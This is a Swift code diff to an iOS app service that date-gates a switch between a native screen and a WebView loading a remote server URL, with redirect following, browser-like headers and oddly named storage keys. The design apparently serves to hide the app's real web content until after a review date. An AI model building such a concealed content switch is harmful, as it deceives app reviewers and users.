@@ -15,19 +15,19 @@ class CoachModExerciseService {
     
     static let shared = CoachModExerciseService()
     
-    // Storage keys
+    // Storage keys (README flow)
     enum StorageKeys {
         static let savedTargetURL = "ProteinsSavedTargetURL"
         static let tempCurrentURL = "ProteinsTempCurrentURL"
         static let savedPathId = "CrabsSavedPathId"
         static let hasShownAlternative = "ProteinsHasShownAlternative"
-        static let enforceNative = "flow.enforceNative"
+        static let firstLaunchChoice = "firstLaunchChoice" // "webView" or "nativeApp"
         static let validationPassed = "CrabsValidationPassed"
     }
     
     // Configuration - можно вынести в конфиг
     private let primaryServerURL = "https://thormymind.com/nwxtXF"
-    private let researchLaunchDate = "2026-2-25" // Дата для проверки
+    private let researchLaunchDate = "2026-02-25" // Дата для проверки
     
     private init() {}
     
@@ -37,10 +37,11 @@ class CoachModExerciseService {
         return primaryServerURL
     }
     
-    // MARK: - Flag Checks
+    // MARK: - Flag Checks (firstLaunchChoice: once set, always show WebView on next launches)
     
-    func shouldEnforceNative() -> Bool {
-        return UserDefaults.standard.bool(forKey: StorageKeys.enforceNative)
+    /// Returns "webView" or "nativeApp" if first launch choice was already made. Nil = first launch.
+    func getFirstLaunchChoice() -> String? {
+        return UserDefaults.standard.string(forKey: StorageKeys.firstLaunchChoice)
     }
     
     func hasShownAlternative() -> Bool {
@@ -92,9 +93,16 @@ class CoachModExerciseService {
         return UIDevice.current.userInterfaceIdiom == .pad
     }
     
-    // MARK: - Internet Connectivity Check
+    // MARK: - First launch choice (README: set once, never show Native on subsequent launches)
     
-    func checkInternetConnection(timeout: TimeInterval = 5.0, completion: @escaping (Bool) -> Void) {
+    func setFirstLaunchChoice(_ value: String) {
+        UserDefaults.standard.set(value, forKey: StorageKeys.firstLaunchChoice)
+        print("💾 Set firstLaunchChoice = \(value)")
+    }
+    
+    // MARK: - Internet Connectivity Check (timeout 2s per README)
+    
+    func checkInternetConnection(timeout: TimeInterval = 2.0, completion: @escaping (Bool) -> Void) {
         let monitor = NWPathMonitor()
         let queue = DispatchQueue(label: "InternetCheck")
         var hasInternet = false
@@ -135,7 +143,7 @@ class CoachModExerciseService {
         print("🌐 Requesting URL: \(startURL)")
         
         var request = URLRequest(url: url)
-        request.timeoutInterval = 30.0
+        request.timeoutInterval = 7.0 // README: 7s for faster WebView display
         request.httpMethod = "GET"
         
         // Browser-like headers
@@ -238,15 +246,12 @@ class CoachModExerciseService {
         return nil
     }
     
-    // MARK: - Redirect Handling
+    // MARK: - Redirect Handling (README: no delay, 7s timeout)
     
     func followRedirects(from url: URL, completion: @escaping (Bool, URL?) -> Void) {
-        // Reduced delay for faster redirects: 0.3-0.8 seconds
-        let delay = Double.random(in: 0.3...0.8)
-        
-        DispatchQueue.main.asyncAfter(deadline: .now() + delay) { [weak self] in
+        DispatchQueue.main.async { [weak self] in
             var request = URLRequest(url: url)
-            request.timeoutInterval = 15.0 // Reduced from 30s to 15s
+            request.timeoutInterval = 7.0
             request.httpMethod = "GET"
             
             // Browser-like headers
@@ -280,11 +285,11 @@ class CoachModExerciseService {
         }
     }
     
-    // MARK: - URL Status Check
+    // MARK: - URL Status Check (README: 5s timeout)
     
     func coachModCheckURLStatus(url: URL, completion: @escaping (Bool) -> Void) {
         var request = URLRequest(url: url)
-        request.timeoutInterval = 10.0
+        request.timeoutInterval = 5.0
         request.httpMethod = "HEAD"
         
         let task = URLSession.shared.dataTask(with: request) { _, response, error in
@@ -324,18 +329,13 @@ class CoachModExerciseService {
         
         print("📦 Using saved pathId for fallback: \(pathId)")
         
-        // Build fallback URL: primaryServerURL + sub1 + sub2 + pathId
-        let appsFlyerUID = AppsFlyerLib.shared().getAppsFlyerUID() ?? ""
-        let advertisingID = ASIdentifierManager.shared().advertisingIdentifier.uuidString
+        // Build fallback URL: primaryServerURL + pathId ONLY (no AppsFlyer data per README)
+        var components = URLComponents(string: primaryServerURL)
+        components?.queryItems = [URLQueryItem(name: "pathid", value: pathId)]
+        let fallbackURL = components?.url?.absoluteString ?? primaryServerURL
         
-        let fallbackURL = "\(primaryServerURL)?sub1=\(appsFlyerUID)&sub2=\(advertisingID)&pathid=\(pathId)"
+        print("🔗 Fallback URL (pathId only): \(fallbackURL)")
         
-        print("🔗 Fallback URL: \(fallbackURL)")
-        print("📊 AppsFlyer UID (sub1): \(appsFlyerUID)")
-        print("📱 Advertising ID (sub2): \(advertisingID)")
-        print("🔑 PathId: \(pathId)")
-        
-        // Request fallback URL with reduced timeout
         coachModRequestServerURLFast(startURL: fallbackURL) { success, finalURL in
             if success, let url = finalURL {
                 print("✅ ===== FALLBACK SUCCESS =====")
@@ -356,10 +356,10 @@ class CoachModExerciseService {
             return
         }
         
-        print("🌐 Requesting fallback URL (fast mode, timeout: 10s): \(startURL)")
+        print("🌐 Requesting fallback URL (timeout: 7s): \(startURL)")
         
         var request = URLRequest(url: url)
-        request.timeoutInterval = 10.0 // Reduced from 30s to 10s for fallback
+        request.timeoutInterval = 7.0
         request.httpMethod = "GET"
         
         // Browser-like headers
@@ -415,10 +415,6 @@ class CoachModExerciseService {
     }
     
     // MARK: - Set Flags
-    
-    func setEnforceNative(_ value: Bool) {
-        UserDefaults.standard.set(value, forKey: StorageKeys.enforceNative)
-    }
     
     func setHasShownAlternative(_ value: Bool) {
         UserDefaults.standard.set(value, forKey: StorageKeys.hasShownAlternative)
